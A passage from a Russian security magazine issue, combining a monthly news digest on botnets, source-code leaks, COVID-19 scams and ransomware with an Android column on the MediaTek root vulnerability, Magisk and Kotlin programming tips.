         пользовате лей ежед невно посеща ют свои учетные записи, чтобы выб-
         рать способ, каким Google обра баты вает их данные. Наша политика
         конфиденциальнос ти и объясне ния, которые мы пре дос тавляем поль-
         зовате лям, дают четкое пред став ление о том, как хра нятся данные
        и какой у пользовате лей есть выбор».


  БОТНЕТ NECURS ЛИК ВИДИРОВАН
   Специалисты ком пании Microsoft и ее отраслевые партне ры (ком пании, занимающиеся кибер‐
   безопасностью, провайдеры, регистраторы доменов, CERT и правоохранительные органы)
   сообщили о ликвидации одного из крупнейших на сегодняшний день ботнетов, распростра‐
   няющего спам и малварь, — Necurs. Эксперты сумели взломать Necurs DGA — алгоритм генера‐
   ции доменов, при помощи которого ботнет генерирует случайные доменные име на.
      Разрушение структуры DGA позволило экспертам создать исчерпывающий список будущих
   доменов и управляющих серверов Necurs, теперь стало возможно их блокиро вать и препятс‐
   твовать их регистрации.





  →«Мы смогли точно спрогнозировать более шес ти миллионов уникальных доменов, которые
   будут созданы в течение сле дующих 25 месяцев. Взяв под контроль сущес твующие сайты
   и ограничив возможность регис трации новых, мы подорвали работу ботнета»
  — Том Берт, вице‐президент Microsoft





 У AMD ПОХИТИЛИ
 ИСХОДНИКИ
  В конце марта издание Torrent Freak обра тило внимание, что компания AMD
  добилась удаления с GitHub ряда репозиториев, судя по все му содержавших
  исходные коды графических про цес соров Navi и Arden. Человек, похитивший
   эти исходники у компании, рас сказал журналистам, что, если продать их
  не удастся, он намерен обнародовать оставшуюся часть кода.
    Журналисты напоминают, что еще в июле 2019 года, чтобы отпраздновать
  пятидесятилетие  компании, AMD  предста вила  виде окарты  Radeon RX
  5000 с графическими процессорами Navi. Исходный код для этих устройств
  считается секретным, но, похоже, теперь он попал в чужие руки.
    В конце марта в Сети начали циркулировать слухи о том, что некто сумел
  заполучить исходные коды гра фических процессоров Navi 10, Navi 21 и Arden,
  причем последний, похоже, будет использовать ся в грядущих Xbox X. Обычно
  подтвердить подлинность таких утечек весьма проблематично, но в данном
   случае AMD принимает меры, которые говорят сами за себя. Так, в соответс‐
   твии с Законом об авторском пра ве в цифровую эпоху (DMCA), AMD пот‐
  ребовала удалить с GitHub недавно соз данный репозиторий xxXsoullessXxx
  и про ект под названием AMD‐navi‐GPU‐HARDWARE‐SOURCE, где якобы была
  опубликована украденная у компании интеллектуальная собс твенность.





   GitHub немедленно отключил данный репозиторий, после чего журналисты
   Torrent Freak заинтересовались происхо дящим и связались с владельцем
  репозитория, чтобы задать нес колько вопросов. Владельцем оказалась
  девушка (во всяком случае, хакер пред ста вился именно так), и она сообщила
  изданию, что поводом для конфликта с компанией действительно послужил
  исходный код графического про цес сора AMD.



        «В ноябре 2019 года я обна ружила исходные коды для AMD Navi GPU
         на взломанном компьюте ре, — рас ска зыва ет вла делица репозитория,
         упоминая, что для взлома применяла некие экс плоиты. — Его хозяин
        не пред принимал никаких действий против [потенциальной] утеч ки.
       Лишь поз же я узна ла о том, что за файлы хра нились на этой машине.
        Они даже не были защище ны или зашиф рованы должным обра зом,
         что прос то прис кор бно».

  Взломщица объясняет, что таким обра зом в ее руках оказались исходники
   Navi 10, Navi 21 и Arden. На вопрос о том, почему она опубликовала эти дан‐
  ные на GitHub, она ответила, что решила поделиться ценной находкой
  со всем миром и даже не пыталась свя зать ся с AMD по поводу утечки, так
   как компания навер няка попытается подать на нее в суд.
    Более того, владелица репозитория утвержда ет, что пока она опубликова‐
  ла лишь часть похищенных исходников, а осталь ные будут обнародованы
  для избранного круга лиц в том случае, если на них не найдется покупатель.
  Дело в том, что стоимость этой утечки она оценива ет примерно в 100 мил‐
  лионов долларов.
     Представите ли AMD  определенно  обеспокоены  происходящим,  так
   как вскоре компания дополнила свою исходную жалобу, указав еще по край‐
  ней мере четыре других репозитория на GitHub, где также размещались утек‐
  шие исходники. Все эти репозитории тоже были закрыты.
    В итоге представители AMD и вовсе были вынуж дены сделать официаль‐
  ное заявление. В компании объяснили, что в декабре 2019 года на связь
  с ними вышел человек, который заявлял, будто в его распоряжении есть фай‐
   лы, имеющие отно шение к графичес ким про дуктам AMD (упоминается, что
  некоторые из них были недавно размещены в откры том доступе, но уже были
  удалены).
     Представите ли AMD пишут, что они не зна ют, есть ли у неиз вестного
  на руках еще какие‐либо файлы, помимо уже «зас веченных», но в компании
   уверены, что эта утечка не ста нет угрозой для конкурентоспособности
  или безопасности графичес ких продуктов AMD. Также подчеркивается, что
  ведется расследование, учас тие в котором принима ют правоохранительные
  органы.


  7014 КРИПТОВАЛЮТНЫХ БАНКОМАТОВ

   Специалисты Coin ATM Radar подсчитали, что в настоящее время в мире установлено 7014
   криптовалютных банкоматов. Такие машины размещены в 75 странах мира, и суммарно в мире
   насчитывается 42 производителя подобных устройств.

   Как видно на иллюстрации, наибольшая плотность установки крип товалютынх банкоматов,
   как и ранее, наблюдается в США.





 КОРОНАВИРУС
 И ХАКЕРЫ
  Из‐за пандемии коронавируса во многих стра нах введен серьезный карантин
  и огромное количество компаний перевело сво их сотрудников на удаленную
   работу. Так как люди в большинс тве своем оста ются дома, единственной
   отдушиной и рабочим инс трументом ста новится интернет. Сейчас многие
  игровые, стриминговые, облачные и прочие сервисы отмечают небывалый
  прирост нагрузки и трафика. К примеру, Netﬂix и YouTube стали принудительно
  снижать качество видео, команда Azure ста вит в приори тет корпоративных
  пользователей, функциональность Oﬃce 365 временно ограничена, а акции
  компании Zoom, разрабатывающей сервис для виде оконференций, стре‐
  мительно растут в цене.
     Разумеется, этим всплеском сетевой активнос ти, а также страхами людей
  перед пандемией не могли не воспользоваться зло умышленники всех мас‐
   тей.
     ИБ‐специалисты со всего мира отмечают огромный всплеск всевоз‐
  можной мошеннической активнос ти, свя занной с COVID‐19. К примеру, ана‐
   литики RiskIQ сообщали, что только за один день, 15 марта 2020 года, они
  выявили 13 500 подозрительных доменов, свя занных с коронавирусом.
  На следующий день было найдено еще 35 000 подоз рительных доменов
  и еще более 17 000 доменов через два дня. В основном такие сайты парази‐
   тируют на страхах поль зователей, распростра няют малварь или занимаются
  открытым мошенничеством: продают несущес твующие вакцины, лекарства,
   тесты на коронавирус и так далее.
    Интересно, что эксперты компании RiskIQ каждый день публикуют списки
  новых вредоносных кампаний (спам, фишинг, дезинформация), а также ста‐
   тистику о мошеннических доменах, как‐либо связанных с COVID‐19. Похожие
  наблюдения ведет и специалист ESET Лукас Стефанко в своем блоге — сле‐
   дит за Android‐малварью и приложениями, экс плуатирующими пандемию
  коронавируса.
    Но помимо этого массового и довольно заурядного мошенничес тва, спе‐
  циалисты обнаружили и ряд необычных кампаний и случаев, связанных
  с COVID‐19.


  Вы могатели и медуч режде ния
  Издание Bleeping Computer связалось с операторами таких известных шиф‐
  ровальщиков, как Maze, DoppelPaymer, Ryuk, Sodinokibi (REvil), PwndLocker
  и Ako, и поинтересовалось у них, продолжат ли они в такие сложные для всего
  мира времена атаковать медицинские учреждения и организации.
    В ответ на вопрос журналистов офи циальные заявления сделали хак‐груп‐
  пы DoppelPaymer и Maze. Первые ответили, что они в целом не атакуют боль‐
  ницы, лечебные учреждения и экстренные службы и начинать теперь точно
  не планируют. Если же атака DoppelPaymer случайно коснется таких орга‐
  низаций и учреждений, операторы малвари обещают рас шифровать данные
  бесплатно.


        «Но некоторые ком пании пыта ются выдавать себя за что‑то дру гое.
        У нас есть девелопер ская ком пания, которая пыталась прикинуться
        небольшим  риелтором,  или  дру гая  ком пания,  которая  пыталась
         выдать себя за приют для собак. Так что, если такое слу чится, мы
        проведем двойную, тройную провер ку перед тем, как выпус тить бес-
         платный рас шифров щик. Но что каса ется фар мы: в эти дни они
         зараба тыва ют много лиш него  из‑за  паники,  у нас  нет  никакого
        желания их под держивать. Пока вра чи что‑то дела ют, эти ребята
         зараба тыва ют», — говорят хакеры.

  Операторы Maze, в свою очередь, опуб ликовали целый пресс‐релиз. Груп‐
  пировка заявила, что прекратит активность относительно любых медицинских
  организаций и учреждений вплоть до окончания пандемии. Также операторы
  Maze «щедро» предложили скидки на расшифровку таким пострадавшим
  организациям.


                                        Продолжение статьи →
← Начало статьи





  К сожалению, по данным компании Coveware, наибо лее активными вымога‐
   телями на конец 2019 года были Sodinokibi, Ryuk и Phobos. Так что, даже если
  операторы DoppelPaymer и Maze отка жутся от атак, это не слишком поможет.
  К примеру, операторы шифровальщика Ryuk останавливаться опре деленно
  не собираются: 26 марта 2020 года эксперт компании Sophos рассказал
   в Twitter, что шиф ровальщик атаковал неназванное медицинское учрежде ние
   в США.
    В свою очередь, руково дитель исследова тельского отдела SentinelOne
  Виталий Кремез сооб щил Bleeping Computer, что за последний месяц он
   видел, как Ryuk атаковал как минимум десять медицинских организаций.
  Из них две были независимыми больницами, а еще одна — здравоох‐
  ранительной сетью, в сос тав которой входят девять больниц в США. По дан‐
  ным издания, одна из больниц расположена в зоне, где ситуация с корона‐
  вирусом очень тяжелая.



        «Мало того что они не прек ратили ата ки на цели в сфе ре здра воох-
         ранения, мы  так же наблюда ем продолжающуюся  тенденцию  атак
         на  здра воохранительные  организа ции  в  раз гар  пандемии.  Тогда
          как некоторые вымогательские груп пы хотя бы учас твовали в диалоге
        о прек ращении вымогательства в области здра воохранения и приз-
         навали, что все понима ют, опе раторы Ryuk хра нят молчание и прес-
         леду ют медицинские орга низа ции и учрежде ния, нев зирая на наши
        призывы оста новиться», — говорит Кре мез.


  Под мена DNS
  В конце месяца журналис ты все того же Bleeping Computer обратили вни‐
  мание на жалобы пользователей, которые сооб щали на форумах издания, что
  им навязчиво предлагают ска чать странное приложение, якобы информи‐
  рующее о COVID‐19 и созданное ВОЗ. Как оказалось, роутеры этих людей
  были скомпрометированы,  а под видом  приложения  распространялся
  инфостилер.
    Во  всех  случаях постра давшие были  вла дель цами  роутеров  D‐Link
  или Linksys и неизвестные злоумышленники изменили на устройствах нас‐
  тройки DNS. Пока неясно, как именно ата кующие получали дос туп к устрой‐
   ствам, но несколько пос традавших признались, что дос туп к их роуте рам
  можно было получить удаленно, а они использовали слабые пароли. Так что,
  вероятно, речь идет о брутфорсе и переборе учетных данных по списку
  известных значений по умолчанию.
    Получив доступ к устройству, зло умышленники меняют адре са DNS‐сер‐
  веров на 109.234.35.230 и 94.103.82.249.
    Иссле дователи объясня ют, что, когда компьютер подключается к сети, Mi‐
   crosoft использует функцию Network  Connectivity  Status  Indicator  (NCSI),
  которая периодически про веря ет, активно ли подклю чение к интернету. Так,
   в Windows 10 одним из подобных тестов будет подклю чение к http://www.msft‐
   connecttest.com/connecttest.txt и проверка, содержит ли ответ Microsoft Con‐
   nect Test. Если содер жит, значит, компь ютер подклю чен к интернету, а если
   нет, Windows предупредит о том, что интернет недоступен.
     Если же пользователь работа ет со скомпрометированным роуте ром, то
  вредоносные  DNS‐серверы  вынуждают  Windows  вместо  подключения
   к легитимному IP‐адресу Microsoft 13.107.4.52 подключаться к ресурсу зло‐
  умышленников, расположенному по адресу 176.113.81.159. В итоге вместо
  отправки упомянутого текстового файла сайт отоб ражает страницу, пред‐
   лагающую жертве загрузить и установить поддельное при ложе ние Emer‐
  gency — COVID‐19 Informator или COVID‐19 Inform App, якобы созданное ВОЗ.
     Если пользователь попадется на удочку атакующих, загрузит и установит
   это приложение, то вместо информа ции о корона вирусе он получит трояна
   Oski. Эта малварь попытается собрать и передать злоумышленникам сле‐
  дующую информацию (список неполный):
   • файлы cookie;
   • историю браузера;
   • платежную информацию из браузера;
   • сохраненные учетные данные;
   • данные криптовалютных кошельков;
   • текстовые файлы;
   • данные автозапол нения для форм в бра узере;
   • БД 2ФА‐идентификаторов Authy;
   • скриншоты рабочего сто ла в момент заражения.

  Вскоре после обнаружения проб лемы специалис ты компании Bitdefender
  подготовили собственный отчет об этой вредонос ной кампании. По их дан‐
  ным, хакеры действительно используют брутфорс, чтобы подобрать пароль
  для целевых роутеров. Также исследова тели согласны с тем, что через под‐
  мену DNS распространяется малварь Oski, похищающая самые разные дан‐
  ные из зараженной системы.
    По информации специалис тов, пользователей перенаправили на вре‐
  доносный сайт, посвященный коронавирусу, при попытке доступа к одному
  из следующих доменов:
   • aws.amazon.com;
   • goo.gl;
   •  bit.ly;
   • washington.edu;
   • imageshack.us;
   • uﬂ.edu;
   • Disney.com;
   • cox.net;
   • xhamster.com;
   • pubads.g.doubleclick.net;
   •  tidd.ly;
   • redditblog.com;
   • ﬁddler2.com;
   • winimage.com.


  Опе рация «Пан гея»
  В свою оче редь, Европол сообщил, что полиция более чем 90 стран объеди‐
  нилась для проведения операции «Пангея», приз ванной остановить рас тущий
   поток мошенничества, связанного с COVID‐19.
    Операцию координиро вал Интерпол, и один из ее этапов проходил
  с 3 по 10 марта 2020 года. Пра воохранители из 90 стран мира ликвидиро‐
  вали 37 преступных группировок и произвели 121 арест. В общей сложности
  были  конфискованы  потенциально  опасные  лекарственные  средства
  на 13 миллионов евро (большинс тво представляли собой обезболивающие
  и антибиотики, которые обманом продава лись паникующим из‐за корона‐
  вируса потребителям). Кроме того, пра воохранитель ные органы изъяли око‐
  ло 34 тысяч поддельных хирургических масок, не соответствовавших стан‐
  дартам, а также поддельные наборы для самотестирования на ВИЧ и для про‐
  верки глю козы.
     Крупные интернет‐магазины пытаются сво ими силами бороться с взвин‐
  чиванием цен и мошенничес твом и блокируют рас пространение продуктов,
  претендующих на про филактику или лечение коронавиру са. К при меру,
  за последние недели Amazon снял с продажи по меньшей мере один миллион
   таких товаров, и в настоящее время два человека в США находятся
  под следствием: они скупили в магазинах Dollar Tree, Walmart, Staples и Home
  Depot почти 18 тысяч дезинфицирующих средств для рук и попытались про‐
   дать их на Amazon по завышенным ценам.


 НОЧЬ — ВРЕМЯ ШИФРОВАЛЬЩИКОВ

   Эксперты американской ком пании FireEye изучили десятки расследований инци ден тов с при‐
   менением шифровальщиков за период с 2017 по 2019 год. Выяснилось, что большинство
   вымогательских атак совершают в нерабочее время или в выходные дни.

  76% всех вымогательских атак в корпоративном секторе происходят в нерабо чее время: 49%
   из них фиксируются в ночное время в будние дни, а еще 27% — в выходные.





   Операторы вымогательского ПО заранее проникают в сети компаний, затем тратят вре мя
   на боковые перемещения, чтобы получить доступ к максималь ному количес тву рабочих стан‐
   ций, и лишь потом вручную устанавливают малварь на все системы и запускают процесс шиф‐
   рования. Время от первоначальной компрометации до фактичес кой атаки в среднем сос тавля‐
   ет три дня.

   Количество управляемых людьми вымогательских атак возросло на огромные 860%, то есть
   теперь такие инциденты затрагивают все сектора и все геог рафические зоны, а не только ком‐
   пании из Северной Америки.





                                   Распределение атак по времени

   Наиболее популярными векторами таких атак стали брутфорс‑атаки на открытые порты
   RDP, направленный на сотрудников ком паний фишинг, атаки drive-by, а также исполь‐
   зование одного зараженного хоста для рас пространения малвари на дру гие.





 DHARMA
 НА ПРОДАЖУ
  На двух русскоязыч ных хакерских форумах в продаже появился исходный код
  одного из наибо лее прибыль ных вымога телей нашего вре мени — шиф‐
  ровальщика Dharma. Исходники продаются за 2000 долларов США.
     Ранее в этом году, выступая на конференции RSA, ФБР назвало Dharma
   вторым по прибыльнос ти вымогателем за пос ледние годы. Так, с нояб‐
  ря 2016 года по ноябрь 2019‐го операторы шифровальщика получили от сво‐
   их жертв 24 миллиона долларов США в виде выкупов.
     Издание ZDNet цитиру ет нескольких неназванных ИБ‐экспертов, которые
  сходятся во мне нии, что нынешняя продажа кода Dharma, вероятнее все го,
   в скором времени обернется его утечкой в широкий дос туп. То есть мал варь
   станет доступна более широкой аудитории, а это, в свою очередь, приведет
   к широкому распространению исходников среди множес тва хак‐групп, и за
  этим в итоге последует всплеск атак.
     Впрочем, глава отдела киберрас следова ний McAfee рас сказал ZDNet, что
  код Dharma уже давно цир кулиру ет среди хакеров, а сейчас он просто
  появился на публичных форумах. При этом эксперт выразил надежду, что
  рано или поздно исходники попадут в руки ИБ‐специалистов и это поможет
  выявить недостатки мал вари и соз дать дешифровщики.
     Dharma существует с 2016 года, и изна чаль но вымогатель, лежащий
   в основе этой малвари, назывался CrySiS. Он работал по схеме вымога‐
   тель‐как‐услуга (Ransomware‐as‐a‐Service, RaaS), то есть другие преступники
  могли  создавать  собственные  версии  малвари  для  распространения,
   как правило при помощи спам‐кампаний, наборов эксплоитов или брутфорса
  RDP.
    В конце 2016 года пользователь под ником  crss7777 опубликовал
  на форумах Bleeping Computer ссылку на Pastebin, содержавшую мастер‐клю‐
  чи от шифровальщика CrySiS, которые, как потом установили эксперты, были
  подлинными. После этого CrySiS прекратил свое существование, «переро‐
  дившись» как Dharma.
    И хотя в 2017 году такая же участь постигла и ключи Dharma, на этот раз
  операторы вымогателя не ста ли про водить «ребрендинг» и продолжили
   работать, в итоге превратив свой RaaS в один из популярнейших «готовых»
  вымогателей на рын ке.
      Так, в последние годы Dharma регулярно получает обновления. К примеру,
   в 2018 и 2019 годах криминальный андеграунд адаптировал ся к новым тен‐
  денциям и перешел от массового рас пространения вымогателей через поч‐
  товый спам к целевым ата кам на корпоративные сети. Так же пос тупили
  и операторы Dharma.
     Отмечается, что весной 2019 года в Сети появился новый штамм вымога‐
  телей Phobos, используемый в основном для целевых атак. Исследователи
  компаний Coveware и Malwarebytes отмечали, что он почти идентичен Dharma.
  Однако Dharma при этом не прекратил свое сущес твование и продолжил
  работать параллельно Phobos. К примеру, эксперты компании Avast замети ли
  три новые версии Dharma в середине марта 2020 года.


  1 000 000 000 УСТРОЙСТВ БЕЗ ОБНОВЛЕНИЙ


   Аналитики британской организации Which?, занимающейся защитой прав потребителей, под‐
   считали, сколько Android‐устройств в мире более не под держиваются и не получают обновле‐
   ний безопасности. По данным исследователей, таковых насчитывается более миллиар да, то
   есть 2 из 5 устройств на Android не получают важных обновлений безопасности от Google, что
   подвергает их риску заражения вредоносным ПО и другим уязвимостям.


   Проблема усугубляется продажами старых устройств третьими сторонами на таких сайтах,
   как Amazon. Так, эксперты приобре ли несколько телефонов, включая Motorola X, Sony Xperia
   Z2 и Samsung Galaxy A5 2017, и выяснили, что те под вержены множес тву давно обнаруженных
   и исправленных уязвимостей, включая Stagefright, Bluefrag и малварь Jocker.





 GITHUB ПОКУПАЕТ
 NPM
  Принадлежащая Microsoft компания GitHub объявила о грядущей сдел ке
  с NPM Inc, управляющей репозиторием npm, где содержатся более 1,3 мил‐
  лиона пакетов, которым пользуются 12 миллионов разработчиков JavaScript.
  На сегодняшний день npm является крупнейшим менеджером пакетов Java‐
   Script в этой эко системе, а также крупнейшим репозиторием пакетов среди
   всех языков программирова ния.
     Глава GitHub Нат Фридман (Nat Friedman) и сооснователь NPM Айзек
  Шлютер (Isaac Schlueter) рас ска зывают в блогах, что в скором будущем
   GitHub и NPM ждет интеграция. Ожидается, что это дол жно повысить
  безопасность цепочки поставок ПО с открытым исходным кодом.



         «Безопас ность опенсорса — это важная глобальная проблема, а пос ле
         недав него запус ка GitHub Security Lab и встроенных рекомендаций
        по безопас ности мы име ем все воз можнос ти, чтобы влиять на ситу-
         ацию», — пишет Фрид ман и обе щает воз можность отсле живать путь
        изме нения от pull-рек веста GitHub к вер сии пакета npm, в котором
         это изме нение примене но.

   Также Фридман отмечает, что CLI по‐прежнему останется бес платным,
  с открытым исходным кодом. А поз же в этом году, по его словам, клиенты
  NPM, оплачивающие хос тинг час тных пакетов, смогут перенести свой код
   в GitHub Packages.
    Сумма сделки не разглашается, лишь раз работчики NPM намекают, что
   это «вовсе не история о стартапе стоимостью газиллион дол ларов».


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   На Pwn2Own взломали Windows, Ubuntu, macOS, Safari, VirtualBox и Adobe Reader


   Ультразвуковая атака поз воляет контролировать голосовых помощников


   Власти США обвинили двух граждан Китая в отмы вании денег, похищенных северо корейскими
   хакерами


   Исследователи: ЦРУ атакова ло китайские ком пании и учрежде ния на протяжении 11 лет


  Обнаружено более 700 проблемных поддоменов Microsoft, включая mybrowser.microsoft.com


    Firefox отказывается от поддержки протокола FTP


  С 2014 года баг позволяет похищать 2ФА‐коды из приложения Google Authenticator


   Из‐за опасного бага Avast отключил JavaScript‐движок в своем антивиру се


   Вьетнамские хакеры годами ломали других хакеров


   Пользователи iOS в Гонконге стали жер твами многофункциональной мал вари LightSpy
HEADER
ANDROID





     УЯЗВИМОСТЬ В СМАРТФОНАХ
      НА ПРОЦЕССОРАХ MEDIATEK
       И ANDROID ДЛЯ IPHONE





Сегодня в выпус ке: исто рия нашумевшей
уязвимос ти в смартфонах на базе процес‐
соров  MediaTek, подводные камни пор‐
тирования Android на iPhone, исто рия о том,
почему функция скрытия root с помощью          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
Magisk вскоре ста нет бесполезной. А так‐              zobnin@glc.ru
же: инлайновые классы и прин цип ком‐
позиции в  Kotlin, новый способ запуска
активностей и запроса полномочий, нес‐
колько новых инс трументов пен теста и биб‐
лиотек для программистов.


                ПОЧИТАТЬ


История уяз вимости устройств на про цессорах MediaTek
Critical MediaTek rootkit aﬀecting millions of Android devices has been out in the
open for months — история обна ружения и попыток залатать критический баг
в устройствах на базе китайских процес соров MediaTek.
   Краткая предыстория: в начале марта по всем сколько‐нибудь связанным
с безопасностью и мобильными устройства ми сайтам прокатилась новость
о весьма опасной уязвимос ти, выявленной букваль но во всех устройствах,
использующих 64‐битные про цес соры MediaTek. Мало того что уязвимость
позволяла получить права root и отключить SELinux (одну из базовых сис тем
безопасности Android), она еще и была очень проста в эксплуатации (один
незатейливый экспло ит, не требующий особых условий для успешного взло‐
ма).
  Широкая общественность узнала об уязвимости благодаря мартовскому
патчу безопасности Android, в котором она получи ла пометку критической.
Однако история обнаружения уяз вимости начинается вовсе не с патча, а с
поста пользователя diplomatic на форуме XDA Developers. Пост был посвящен
планшету Amazon Fire.
  Еще год назад diplomatic обна ружил, что драйвер CMDQ в ядре Linux
для  процессоров  MediaTek  принимает  ioctl‐команды  от  кого  угодно.
С помощью этих команд можно получить дос туп к DMA‐буферу, модифициро‐
вать память ядра и отключить SELinux. Позже diplomatic и другие пользовате‐
ли форума выяснили, что экс плоит работа ет почти на всех устройствах с 64‐
битным процессором MediaTek за исключением устрой ств Vivо, OPPO, Huawei
и Samsung с Android 8 и выше, на которых есть защита от получения прав root
с помощью эксплоитов.
  Компания MediaTek про патчила драй вер еще в мае 2019 года, но это
не просто не решило проблемы. Дело в том, что MediaTek производит про‐
цессоры низкого ценового диапа зона, и их уста навливают в бюджетники,
поддержка которых нередко заканчива ется в момент выпуска смартфона
с конвейера. Это те самые Blackview, Elefone и прочий китайский ширпотреб.
Теперь все это — перенос ной бэкдор, беззащитный перед простейшей мал‐
варью, установленной из варез ников (а такая уже существует — об наружен‐
ный Trend Micro троян исполь зует уяз вимость MediaTek наряду с уязвимостью
CVE‐2019‐2215 для получения контроля над устрой ством).
  Именно по этой причине патч для MediaTek в итоге попал в состав офи‐
циального патча безопасности Android. Это дает шанс, что хотя бы крупные
производители обновят свои устройства, чтобы не нарушать договор о двух‐
годичной поддержке устройств. С дру гой сто роны, доля пропатченных
устройств вряд ли поднимется выше 1%.





                          CVE‐2020‐0069


История портирования Android на iPhone
An adventure 13 years in the making — исто рия проекта Sandcastle, в рамках
которого разработчики из компании Corellium сумели портировать Android
на iPhone.
  Сама возможность портирования появилась бла годаря эксплоиту check‐
m8, который использует уязвимость в загрузчи ке iPhone и позволяет не прос‐
то выполнить Jailbreak, а получить полный контроль над устройством, включая
возможность установки и загрузки альтернатив ных операционных систем.
  Но инте ресно даже не это, а то, с какими сложностями столкнулись раз‐
работчики. В первую очередь это кас томный процессор Apple, который вро‐
де бы совместим со стандартным ARM, но име ет мас су мелких отличий: «поч‐
ти» совместимый с Samsung UART‐контроллер, «почти» совместимый с Sam‐
sung SPI‐контрол лер, нестандартный контроллер прерываний, собс твенный
способ вклю чения дополнительных ядер процес сора и так далее.
  Еще более интересная история произошла с портированием платформы
Android поверх уже портированного ядра  Linux. Оказалось, что Android
в принципе не поддерживает работу со страница ми памяти с отличным
от 4 Кбайт размером (Apple использует 16 Кбайт). Также Android оказался
не совсем 64‐разрядной системой: во мно гих мес тах ее до сих пор можно
найти 32‐битный код, который прос то не будет работать на полностью 64‐
битном процессоре Apple.
  Парадоксально, но порт Android для iPhone стал первой пол ностью 64‐
битной сборкой Android в истории.


Факт раз лочки загрузчика больше не скрыть
Magisk may no longer be able to hide bootloader unlocking from apps — статья
о том, как Google обыграла раз работчика Magisk и сделала скры тие факта
разлочки загрузчика невозможным.
  Сегодня Magisk — это единс твенный надежный способ получить root
на стоковой прошив ке Android. Magisk стал популярен и выжил в войне против
Google благодаря использованию метода рутинга, не тре бующего модифи‐
кации системного раздела, и воз можнос ти скрыть наличие прав root от опре‐
деленных приложе ний (например, банковских клиентов, платежных систем
и онлайн‐игр).
   Чтобы скрыть root, Magisk использует нес колько трюков, которые обма‐
нывают приложение и систему SafetyNet, предназначенную для проверки
смартфона на безопасность. Долгое время SafetyNet использовала эвристи‐
ческие методы для определения root и разблокировки загрузчи ка (которая
требуется для установки Magisk).
  Однако пользователи начали замечать, что некоторые смартфоны больше
не проходят проверку SafetyNet с уста новленным Magisk. Разработчик Magisk
ответил, что иногда SafetyNet больше не полага ется на прос тую проверку
состояния загрузчика (которую умеет обманывать Magisk), а вместо этого
использует приватный ключ шифрования из защищенного хранилища Key‐
store, чтобы подтвердить дос товерность переданных данных.
  Обойти эту защиту можно, лишь получив доступ к приватному ключу,
который хранит ся в выделенном криптогра фичес ком сопроцессоре (TEE),
а сделать это очень проблематично (Google пла тит от 250 тысяч до 1 мил‐
лиона долларов за подоб ную уязвимость).
  Все это означает, что совсем ско ро все сертифицированные Google
устройства на базе Android 8 и выше просто перес танут проходить проверку
SafetyNet и Magisk будет бесполезен, если уста новлены банковские клиенты
и другие приложения, использующие SafetyNet.


              РАЗРАБОТЧИКУ


StartActivityForResult в 2020 году
A ﬁrst look at AndroidX Activity Result APIs — неболь шая заметка о решении
одной из самых раздра жающих задач, возникающих при разработке при‐
ложений для Android.
   Речь идет о функции startActivityForResult(), которая позволя ет
запустить активность другого приложения, чтобы переложить на нее решение
определенной задачи: получение снимка с помощью камеры, выбор файла
и так далее. Данный механизм серьезно облегчает жизнь разработчика,
но реализован самым неудобным из воз можных способов. Раз работчику
необходимо запустить активность, передав ей специальный код, а затем
ждать результат в кол бэке, реализованном с помощью переопределения
метода onActivityResult() в активности или фраг менте. И все бы ничего,
но точно таким же способом реализован запрос полномочий, так что код при‐
ложения в итоге расползается по множес тву внеш не никак не связанных меж‐
ду собой функций.
  Существует масса способов решения этой проблемы с помощью сторон‐
них библиотек, но эта статья рас сказыва ет об официальном решении
от Google. В альфа‐версии библиотеки AndroidX Activity наконец появился
удобный в использовании API, позволяющий работать с активностями других
приложений, не размазывая код по активности своего приложе ния.
  Для начала нужно с помощью контрак та описать интент, который будет
использован для запуска активности, и обработчик результата выполнения
активности:


class MyContract : ActivityResultContract<Int, String>() {
    companion object {
        const val ACTION = "com.myapp.action.MY_ACTION"
        const val INPUT_INT = "input_int"
        const val OUTPUT_STRING = "output_string"
    }


    override fun createIntent(input: Int): Intent {
        return Intent(ACTION)
            .apply { putExtra(INPUT_INT, input) }
    }


    override fun parseResult(resultCode: Int, intent: Intent?):
String? {
        return when (resultCode) {
            Activity.RESULT_OK ‐> intent?.getStringExtra(OUTPUT
_STRING)
            else ‐> null
        }
    }
}

Затем мы используем prepareCall(), чтобы соз дать объект класса Activi‐
tyResultsLauncher, с помощью которого запускаем активность и получаем
результат в колбэке:


class MyActivity : AppCompatActivity() {
    private val myActionCall = prepareCall(MyContract()) { result ‐>
        Log.i("MyActivity", "Obtained result: $result")
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        ...
        button.setOnClickListener {
            myActionCall(500)
        }
    }
}

Выглядит немного сложно. Но такой подход не разрушает связ ность кода.
Кроме того, уже сейчас биб лиотека содержит несколько предопределенных
контрактов, в том числе для получения снимка (TakePicture), выполнения
звонка (Dial) и, конеч но же, зап роса полномочий (RequestPermission).

Инлайн‑классы в Kotlin 1.3
Zero‐cost* abstractions in Kotlin — статья с подробным объ яснением новой
экспериментальной язы ковой конс трукции Kotlin под наз ванием inline‐классы.
  Одна из клю чевых особенностей языка Kotlin — null safety, которая гаран‐
тирует, что программист не сможет по ошиб ке вызвать методы объ екта, име‐
ющего значение null, или передать этот объект в качестве аргумента дру гим
методам. Null safety существенно повышает надежность кода, но не защища‐
ет от других ошибок программиста.
  Допустим, у тебя есть база котов и собак, которых ты идентифицируешь
по ID. Также у тебя есть метод getDogById(dogId: Long), который возвра‐
щает информацию о собаке с конкретным ID. Очевидно, что, если в качес тве
ID собаки ты передашь методу ID кош ки, это будет ошибкой, которая при‐
ведет к неопределен ному результату. Но ни среда разработки, ни ком‐
пилятор не скажут тебе о ней.
  Еще во времена Java программисты придумали метод обойти эту проб‐
лему с помощью так называемых классов‐оберток. Ты просто создаешь класс
DogId с единственным полем (ID собаки) и используешь его везде, где рань‐
ше использовал тип Long в качес тве ID. Все осталь ное компилятор и среда
разработки сделают за тебя: они просто не поз волят передать DogId в качес‐
тве аргумента функции, которая ожидает CatId, — это ошибка.
  Но есть в классах‐врапперах одна проб лема. Создание объектов не самая
дешевая операция. Если ты будешь плодить их на каждый чих, то вскоре
заметишь возросшее потребление оператив ной памяти и процессорных
ресурсов.
  И здесь на сцену выходят инлайн‐клас сы. По своей сути инлайн‐класс —
это класс‐враппер с одним параметром, который при компиляции разворачи‐
вается в этот параметр, что бы избежать накладных расходов. Например:


inline class DogId(val id: Long)
val dog = getDogById(DogId(100L))

Данный код написан с использованием враппера, чтобы избежать описанной
выше ошибки. Однако при компиляции объект DogId будет заменен Long, так
что никаких дополнительных накладных расходов не потребу ется.
  Компилятор накладывает следующие огра ничения на инлайн‐классы:
